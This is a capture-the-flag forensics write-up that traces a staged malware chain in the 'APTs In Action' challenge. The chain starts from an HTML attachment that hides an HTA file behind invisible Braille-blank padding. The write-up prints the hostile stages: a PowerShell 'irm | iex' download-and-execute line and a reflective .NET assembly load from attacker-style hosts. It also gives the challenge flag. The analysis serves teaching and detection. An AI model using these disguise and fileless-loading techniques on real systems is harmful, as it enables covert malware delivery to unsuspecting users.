# APTs In Action — forensics, easy — 1000 pts

**Flag:** `HTB{APTs_4r3_n0t_4_j0k3_bf6c76015b3a3abc2993bdd08a7e384a}`

Handout: a single 713-byte `attachment.html`. Live instance hosts the rest of the chain.

---

## Step 1 — read the attachment

```html
<script>
window.open('', '_self', '');
window.resizeTo(1, 1);
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://connectwithme.htb/te/hhhh.php', true);
xhr.send();
setTimeout(function(){ window.close(); }, 5000000);
</script>
<iframe src="http://cbmeli.htb/te/Books_A0UJKO.pdf%E2%A0%80%E2%A0%80…%E2%A0%80.hta"
        height="200" width="300" title="GG"></iframe>
```

Two things:

- The script shrinks the window to 1×1 and closes it later — anti-analysis / visual concealment.
- The iframe fetches what *appears* to be `Books_A0UJKO.pdf`. `%E2%A0%80` is **U+2800 BRAILLE
  PATTERN BLANK**, repeated 26 times, followed by `.hta`.

U+2800 is a whitespace-*looking* but non-whitespace character that most UIs render as nothing. The
real extension is **`.hta`** — a Windows HTML Application, executed by `mshta.exe` with full trust.
This is extension masquerading, the same family as RTLO filename spoofing.

## Step 2 — reach the vhosts without touching /etc/hosts

Every `*.htb` name resolves to the same container. The Flask vhost dispatcher matches on the
**Host header including the port**, so no root-privileged hosts-file edit is needed:

```console
$ curl -H 'Host: cbmeli.htb:30273' "http://$IP:$PORT/te/Books_A0UJKO.pdf$(printf '%%E2%%A0%%80%.0s' {1..26}).hta"
```

*(This trick generalises to any multi-vhost challenge container and is worth remembering.)*

## Step 3 — decode the HTA

The retrieved file is a WelsonJS-branded HTA containing three XOR-`0x04` encoded strings:

```
powershell irm http://dropthemall.htb/tt/become.txt | iex
winmgmts:\\.\root\cimv2
Win32_Process
```

So: WMI `Win32_Process.Create` is used to spawn PowerShell, which downloads and executes the next
stage. A single-byte XOR is doing all the "obfuscation".

## Step 4 — follow the chain

```console
$ curl -H 'Host: dropthemall.htb:30273' http://$IP:$PORT/tt/become.txt
```

PowerShell that hides its console via `GetConsoleWindow` / `ShowWindow`, then:

```powershell
[Reflection.Assembly]::Load(
  (New-Object Net.WebClient).DownloadData("http://laststage.htb/tt/tedfd.te")
).EntryPoint.Invoke($null,$null)
```

Reflective .NET assembly loading — fileless, never written to disk.

## Step 5 — the last hop

```console
$ curl -H 'Host: laststage.htb:30273' http://$IP:$PORT/tt/tedfd.te
HTB{APTs_4r3_n0t_4_j0k3_bf6c76015b3a3abc2993bdd08a7e384a}
```

The final stage is literally the flag.

---

## Chain summary

```
attachment.html
  ├── XHR beacon      -> connectwithme.htb/te/hhhh.php
  └── iframe          -> cbmeli.htb/.../Books_A0UJKO.pdf␀×26.hta   (masqueraded HTA)
        └── XOR-0x04  -> WMI Win32_Process.Create -> powershell irm | iex
              └──        dropthemall.htb/tt/become.txt             (hide console)
                    └──  Reflection.Assembly::Load
                          └── laststage.htb/tt/tedfd.te            == flag
```

---

## Lessons

- **Invisible Unicode in filenames is a live technique.** U+2800 (and U+202E RTLO, U+00A0, U+200B)
  pad an extension out of view. Detection should normalise and reject non-ASCII in filenames, and
  analysts should always URL-decode before judging a file type.
- `.hta` remains a trusted-execution path on Windows. Treat `mshta.exe` in a process tree the way
  you treat `wscript.exe`.
- **`Host: <domain>:<port>`** dodges `/etc/hosts` edits entirely when a container serves multiple
  vhosts — faster, scriptable, no root.
- Single-byte XOR is not encryption. Try `0x00`–`0xFF` before doing anything cleverer.
